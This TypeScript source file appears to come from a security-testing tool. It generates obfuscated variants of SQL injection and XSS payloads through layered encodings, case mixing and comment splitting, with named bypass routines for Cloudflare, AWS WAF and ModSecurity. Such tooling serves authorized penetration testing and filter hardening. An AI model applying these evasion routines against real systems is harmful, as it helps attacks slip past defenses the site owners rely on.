// Encoding and obfuscation utilities for WAF bypass techniques
// Based on latest research from PortSwigger, OWASP, and security community

export interface EncodingOptions {
  doubleUrlEncode?: boolean;
  unicodeEncode?: boolean;
  htmlEntityEncode?: boolean;
  mixedCaseEncode?: boolean;
  hexEncode?: boolean;
  octalEncode?: boolean;
  base64Encode?: boolean;
  urlEncode?: boolean;
}

export class PayloadEncoder {

  /**
   * Double URL encode payload
   * Example: ' -> %27 -> %2527
   */
  static doubleUrlEncode(payload: string): string {
    return encodeURIComponent(encodeURIComponent(payload));
  }

  /**
   * Unicode encode special characters
   * Example: ' -> \u0027
   */
  static unicodeEncode(payload: string): string {
    return payload.replace(/['"<>&]/g, (char) => {
      const unicode = char.charCodeAt(0).toString(16).padStart(4, '0');
      return `\\u${unicode}`;
    });
  }

  /**
   * HTML entity encode special characters
   * Example: ' -> &#39; or &#x27;
   */
  static htmlEntityEncode(payload: string, useHex = false): string {
    const entityMap: { [key: string]: string } = {
      '"': useHex ? '&#x22;' : '&#34;',
      "'": useHex ? '&#x27;' : '&#39;',
      '<': useHex ? '&#x3C;' : '&#60;',
      '>': useHex ? '&#x3E;' : '&#62;',
      '&': useHex ? '&#x26;' : '&#38;',
      '=': useHex ? '&#x3D;' : '&#61;',
      ' ': useHex ? '&#x20;' : '&#32;'
    };

    return payload.replace(/["'<>&= ]/g, (char) => entityMap[char] || char);
  }

  /**
   * Mixed case encoding for keywords
   * Example: UNION SELECT -> uNiOn SeLeCt
   */
  static mixedCaseEncode(payload: string): string {
    const keywords = [
      'UNION', 'SELECT', 'FROM', 'WHERE', 'INSERT', 'UPDATE', 'DELETE',
      'DROP', 'CREATE', 'ALTER', 'EXEC', 'EXECUTE', 'SCRIPT', 'ALERT',
      'JAVASCRIPT', 'VBSCRIPT', 'ONLOAD', 'ONERROR', 'ONCLICK'
    ];

    let result = payload;
    keywords.forEach(keyword => {
      const mixedCase = keyword.split('').map((char, index) =>
        index % 2 === 0 ? char.toLowerCase() : char.toUpperCase()
      ).join('');

      result = result.replace(new RegExp(keyword, 'gi'), mixedCase);
    });

    return result;
  }

  /**
   * Hex encode characters
   * Example: ' -> 0x27
   */
  static hexEncode(payload: string): string {
    return payload.replace(/['"<>&]/g, (char) => {
      const hex = char.charCodeAt(0).toString(16);
      return `0x${hex}`;
    });
  }

  /**
   * Octal encode characters
   * Example: ' -> \047
   */
  static octalEncode(payload: string): string {
    return payload.replace(/['"<>&]/g, (char) => {
      const octal = char.charCodeAt(0).toString(8);
      return `\\${octal.padStart(3, '0')}`;
    });
  }

  /**
   * Base64 encode payload
   */
  static base64Encode(payload: string): string {
    return btoa(payload);
  }

  /**
   * Apply multiple encoding techniques
   */
  static applyEncodings(payload: string, options: EncodingOptions): string[] {
    const encodedPayloads: string[] = [payload]; // Include original

    if (options.doubleUrlEncode) {
      encodedPayloads.push(this.doubleUrlEncode(payload));
    }

    if (options.unicodeEncode) {
      encodedPayloads.push(this.unicodeEncode(payload));
    }

    if (options.htmlEntityEncode) {
      encodedPayloads.push(this.htmlEntityEncode(payload, false));
      encodedPayloads.push(this.htmlEntityEncode(payload, true)); // hex variant
    }

    if (options.mixedCaseEncode) {
      encodedPayloads.push(this.mixedCaseEncode(payload));
    }

    if (options.hexEncode) {
      encodedPayloads.push(this.hexEncode(payload));
    }

    if (options.octalEncode) {
      encodedPayloads.push(this.octalEncode(payload));
    }

    if (options.base64Encode) {
      encodedPayloads.push(this.base64Encode(payload));
    }

    if (options.urlEncode) {
      encodedPayloads.push(encodeURIComponent(payload));
    }

    return [...new Set(encodedPayloads)]; // Remove duplicates
  }

  /**
   * SQL injection specific obfuscation techniques
   */
  static sqlObfuscation(payload: string): string[] {
    const obfuscated = [payload];

    // Comment-based obfuscation
    obfuscated.push(payload.replace(/\s+/g, '/**/'));
    obfuscated.push(payload.replace(/\s+/g, '/*comment*/'));

    // Space alternatives
    obfuscated.push(payload.replace(/\s+/g, '+'));
    obfuscated.push(payload.replace(/\s+/g, '%09')); // Tab
    obfuscated.push(payload.replace(/\s+/g, '%0A')); // Line Feed
    obfuscated.push(payload.replace(/\s+/g, '%0D')); // Carriage Return

    // Function-based obfuscation
    if (payload.includes('SELECT')) {
      obfuscated.push(payload.replace(/SELECT/gi, 'SEL/**/ECT'));
      obfuscated.push(payload.replace(/SELECT/gi, 'SE/**/LECT'));
    }

    if (payload.includes('UNION')) {
      obfuscated.push(payload.replace(/UNION/gi, 'UNI/**/ON'));
      obfuscated.push(payload.replace(/UNION/gi, 'UN/**/ION'));
    }

    return [...new Set(obfuscated)];
  }

  /**
   * XSS specific obfuscation techniques
   */
  static xssObfuscation(payload: string): string[] {
    const obfuscated = [payload];

    // Case variations
    obfuscated.push(payload.toLowerCase());
    obfuscated.push(payload.toUpperCase());

    // Event handler variations
    const eventHandlers = ['onload', 'onerror', 'onclick', 'onmouseover', 'onfocus'];
    eventHandlers.forEach(handler => {
      if (payload.toLowerCase().includes(handler)) {
        // Add variations with different cases
        obfuscated.push(payload.replace(new RegExp(handler, 'gi'), handler.toUpperCase()));
        obfuscated.push(payload.replace(new RegExp(handler, 'gi'),
          handler.split('').map((c, i) => i % 2 ? c.toUpperCase() : c.toLowerCase()).join('')));
      }
    });

    // Script tag variations
    if (payload.includes('<script>')) {
      obfuscated.push(payload.replace(/<script>/gi, '<SCRIPT>'));
      obfuscated.push(payload.replace(/<script>/gi, '<ScRiPt>'));
      obfuscated.push(payload.replace(/<script>/gi, '<script \\>'));
      obfuscated.push(payload.replace(/<script>/gi, '<script//>'));
    }

    // JavaScript protocol variations
    if (payload.includes('javascript:')) {
      obfuscated.push(payload.replace(/javascript:/gi, 'JAVASCRIPT:'));
      obfuscated.push(payload.replace(/javascript:/gi, 'JaVaScRiPt:'));
      obfuscated.push(payload.replace(/javascript:/gi, 'java\\script:'));
    }

    return [...new Set(obfuscated)];
  }

  /**
   * Generate comprehensive bypass variations for any payload
   */
  static generateBypassVariations(payload: string, attackType: string = 'generic'): string[] {
    let variations = [payload];

    // Apply basic encodings
    const encodingOptions: EncodingOptions = {
      doubleUrlEncode: true,
      unicodeEncode: true,
      htmlEntityEncode: true,
      mixedCaseEncode: true,
      hexEncode: true,
      urlEncode: true
    };

    variations = variations.concat(this.applyEncodings(payload, encodingOptions));

    // Apply attack-specific obfuscation
    if (attackType.toLowerCase().includes('sql')) {
      variations = variations.concat(this.sqlObfuscation(payload));
    } else if (attackType.toLowerCase().includes('xss')) {
      variations = variations.concat(this.xssObfuscation(payload));
    }

    // Remove duplicates and return
    return [...new Set(variations)];
  }
}




/**
 * WAF-specific bypass utilities
 */
export class WAFBypasses {

  /**
   * Cloudflare specific bypasses
   */
  static cloudflareBypass(payload: string): string[] {
    const bypasses = [payload];

    // Cloudflare often filters on specific patterns
    bypasses.push(payload.replace(/'/g, '\\u0027'));
    bypasses.push(payload.replace(/"/g, '\\u0022'));
    bypasses.push(payload.replace(/</g, '\\u003c'));
    bypasses.push(payload.replace(/>/g, '\\u003e'));

    // Use alternative space characters
    bypasses.push(payload.replace(/\s/g, '\\u00A0')); // Non-breaking space
    bypasses.push(payload.replace(/\s/g, '\\u2000')); // En quad

    return [...new Set(bypasses)];
  }

  /**
   * AWS WAF specific bypasses
   */
  static awsWafBypass(payload: string): string[] {
    const bypasses = [payload];

    // AWS WAF character set bypasses
    bypasses.push(payload.replace(/=/g, '\\u003D'));
    bypasses.push(payload.replace(/&/g, '\\u0026'));

    // Normalize unicode
    bypasses.push(payload.normalize('NFD'));
    bypasses.push(payload.normalize('NFKD'));

    return [...new Set(bypasses)];
  }

  /**
   * ModSecurity bypasses
   */
  static modSecurityBypass(payload: string): string[] {
    const bypasses = [payload];

    // ModSecurity rule-specific evasions
    bypasses.push(payload.replace(/union/gi, 'uni/**/on'));
    bypasses.push(payload.replace(/select/gi, 'sel/**/ect'));
    bypasses.push(payload.replace(/script/gi, 'scr/**/ipt'));

    // Case sensitivity exploits
    bypasses.push(this.randomCase(payload));

    return [...new Set(bypasses)];
  }

  /**
   * Generate random case variations
   */
  private static randomCase(str: string): string {
    return str.split('').map(char =>
      Math.random() > 0.5 ? char.toUpperCase() : char.toLowerCase()
    ).join('');
  }
}
